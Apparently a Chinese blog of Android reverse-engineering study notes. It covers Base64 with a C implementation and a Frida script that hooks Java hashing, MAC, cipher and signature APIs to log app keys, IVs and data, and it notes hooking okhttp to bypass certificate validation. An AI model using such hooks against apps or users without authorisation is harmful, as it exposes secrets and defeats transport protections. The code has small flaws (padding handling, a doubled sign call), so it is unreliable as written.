<p>111 &#x3D;&gt; MTEx，每个字符占一个字节，每个字节有8位，总共有24位，而base64编码每个字符用6位表示，所以3个字节需要用4个可打印字符来表示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F T D</span><br><span class="line">70 84 68</span><br><span class="line">01000110   01010100   01000100</span><br><span class="line">(00)010001  (00)100101  (00)010001  (00)000100</span><br><span class="line">17  37  17  4</span><br><span class="line">R I R E</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64字符表</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64_table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64编码函数</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="type">int</span> output_length = <span class="number">4</span> * ((length + <span class="number">2</span>) / <span class="number">3</span>);  <span class="comment">// 计算编码后字符串的长度</span></span><br><span class="line">    <span class="type">char</span>* encoded_data = (<span class="type">char</span>*)<span class="built_in">malloc</span>(output_length + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (encoded_data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="comment">//这一段是编码函数中的循环部分，用于对输入数据进行编码。</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; length; i += <span class="number">3</span>, j += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">//每次处理3个字节的数据。首先，从输入数据中取出3个字节，分别赋值给byte1、byte2和byte3变量。如果输入数据长度不足3字节，则使用0填充。</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> byte1 = input[i];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> byte2 = (i + <span class="number">1</span> &lt; length) ? input[i + <span class="number">1</span>] : <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> byte3 = (i + <span class="number">2</span> &lt; length) ? input[i + <span class="number">2</span>] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        encoded_data[j] = base64_table[byte1 &gt;&gt; <span class="number">2</span>];  <span class="comment">//将byte1右移2位得到高6位的值，作为base64_table的索引，获得对应的Base64字符。</span></span><br><span class="line">        encoded_data[j + <span class="number">1</span>] = base64_table[((byte1 &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">4</span>) | (byte2 &gt;&gt; <span class="number">4</span>)];<span class="comment">//将byte1的低2位与byte2的高4位进行组合，得到一个8位的值，再将该值左移4位，得到base64_table的索引，获得对应的Base64字符。</span></span><br><span class="line">        encoded_data[j + <span class="number">2</span>] = base64_table[((byte2 &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">2</span>) | (byte3 &gt;&gt; <span class="number">6</span>)];<span class="comment">//将byte2的低4位与byte3的高2位进行组合，得到一个8位的值，再将该值左移2位，得到base64_table的索引，获得对应的Base64字符。</span></span><br><span class="line">        encoded_data[j + <span class="number">3</span>] = base64_table[byte3 &amp; <span class="number">0x3F</span>];<span class="comment">//将byte3的低6位作为base64_table的索引，获得对应的Base64字符。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加填充字符</span></span><br><span class="line">    <span class="type">int</span> padding = length % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (padding == <span class="number">1</span>) &#123;</span><br><span class="line">        encoded_data[j - <span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        encoded_data[j - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (padding == <span class="number">2</span>) &#123;</span><br><span class="line">        encoded_data[j - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    encoded_data[output_length] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 添加字符串结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64解码函数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input, <span class="type">int</span>* length)</span> &#123;</span><br><span class="line">    <span class="type">int</span> input_length = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="keyword">if</span> (input_length % <span class="number">4</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> output_length = input_length / <span class="number">4</span> * <span class="number">3</span>;  <span class="comment">// 计算解码后数据长度</span></span><br><span class="line">    <span class="keyword">if</span> (input[input_length - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">        output_length--;</span><br><span class="line">        <span class="keyword">if</span> (input[input_length - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            output_length--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* decoded_data = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(output_length);</span><br><span class="line">    <span class="keyword">if</span> (decoded_data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; input_length; i += <span class="number">4</span>, j += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> ch1 = <span class="built_in">strchr</span>(base64_table, input[i]) - base64_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> ch2 = <span class="built_in">strchr</span>(base64_table, input[i + <span class="number">1</span>]) - base64_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> ch3 = <span class="built_in">strchr</span>(base64_table, input[i + <span class="number">2</span>]) - base64_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> ch4 = <span class="built_in">strchr</span>(base64_table, input[i + <span class="number">3</span>]) - base64_table;</span><br><span class="line"></span><br><span class="line">        decoded_data[j] = (ch1 &lt;&lt; <span class="number">2</span>) | (ch2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (j + <span class="number">1</span> &lt; output_length) &#123;</span><br><span class="line">            decoded_data[j + <span class="number">1</span>] = (ch2 &lt;&lt; <span class="number">4</span>) | (ch3 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j + <span class="number">2</span> &lt; output_length) &#123;</span><br><span class="line">            decoded_data[j + <span class="number">2</span>] = (ch3 &lt;&lt; <span class="number">6</span>) | ch4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *length = output_length;</span><br><span class="line">    <span class="keyword">return</span> decoded_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* original_data = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="type">int</span> original_length = <span class="built_in">strlen</span>(original_data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Base64编码</span></span><br><span class="line">    <span class="type">char</span>* encoded_data = base64_encode(original_data, original_length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Base64 encoded data: %s\n&quot;</span>, encoded_data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Base64解码</span></span><br><span class="line">    <span class="type">int</span> decoded_length;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* decoded_data = base64_decode(encoded_data, &amp;decoded_length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Base64 decoded data: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; decoded_length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, decoded_data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(encoded_data);</span><br><span class="line">    <span class="built_in">free</span>(decoded_data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>消息摘要算法？</p>
<p>算法助手同理</p>
<p>md5 </p>
<p>WT-JS </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="attr">showStacks</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">showDivider</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// console.log(&#x27;frida 已启动&#x27;);</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.<span class="property">showStacks</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Throwable&#x27;</span>).$new(name)))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showDivider</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.<span class="property">showDivider</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`==============================<span class="subst">$&#123;name&#125;</span>==============================`</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showArguments</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;arguments: &#x27;</span>, ...<span class="variable language_">arguments</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.android.okhttp.okio.ByteString&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Encode</span> = &#123;</span><br><span class="line">      <span class="title function_">toBase64</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Base64: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">base64</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Base64: &#x27;, bytesToBase64(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toHex</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Hex: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">hex</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Hex: &#x27;, bytesToHex(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toUtf8</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Utf8: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">utf8</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Utf8: &#x27;, bytesToString(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toAll</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toUtf8</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toResult</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">MessageDigest</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.MessageDigest&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_update = <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_digest = <span class="title class_">MessageDigest</span>.<span class="property">digest</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_digest) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> digest result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Mac</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Mac&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key, AlgorithmParameterSpec</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(key, <span class="title class_">AlgorithmParameterSpec</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> keyBytes = key.<span class="title function_">getEncoded</span>()</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init Key`</span>, keyBytes)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Mac</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Cipher</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Cipher&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_init = <span class="title class_">Cipher</span>.<span class="property">init</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_init) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> mode = <span class="variable language_">arguments</span>[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init mode`</span>, mode)</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])</span><br><span class="line">            <span class="comment">// 安卓10以上私钥是有可能输出不了的</span></span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;OpenSSLRSAPrivateKey&#x27;</span>)) &#123;</span><br><span class="line">              <span class="comment">// const keyBytes = arguments[1];</span></span><br><span class="line">              <span class="comment">// console.log(`$&#123;algorithm&#125; init key`, keyBytes);</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">const</span> keyBytes = <span class="variable language_">arguments</span>[<span class="number">1</span>].<span class="title function_">getEncoded</span>()</span><br><span class="line">              <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init key`</span>, keyBytes)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>)) &#123;</span><br><span class="line">              <span class="keyword">const</span> iv = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>], <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>))</span><br><span class="line">              <span class="keyword">const</span> ivBytes = iv.<span class="title function_">getIV</span>()</span><br><span class="line">              <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init iv`</span>, ivBytes)</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;java.security.SecureRandom&#x27;</span>)) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Cipher</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Signature</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.Signature&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_update = <span class="title class_">Signature</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_sign = <span class="title class_">Signature</span>.<span class="property">sign</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_sign) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; </span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">sign</span>()</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> sign result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">sign</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<h2 id="对称加密算法-amp-非对称加密算法"><a href="#对称加密算法-amp-非对称加密算法" class="headerlink" title="对称加密算法 &amp; 非对称加密算法"></a>对称加密算法 &amp; 非对称加密算法</h2><p>DES&#x2F;CBC&#x2F;PKCS5Padding  原理自查</p>
<p>代码如上</p>
<h2 id="其他乱七八糟的"><a href="#其他乱七八糟的" class="headerlink" title="其他乱七八糟的"></a>其他乱七八糟的</h2><p>图解 HTTP</p>
<p>okhttp框架（学习hook绕过证书单向校验、证书双向校验）</p>
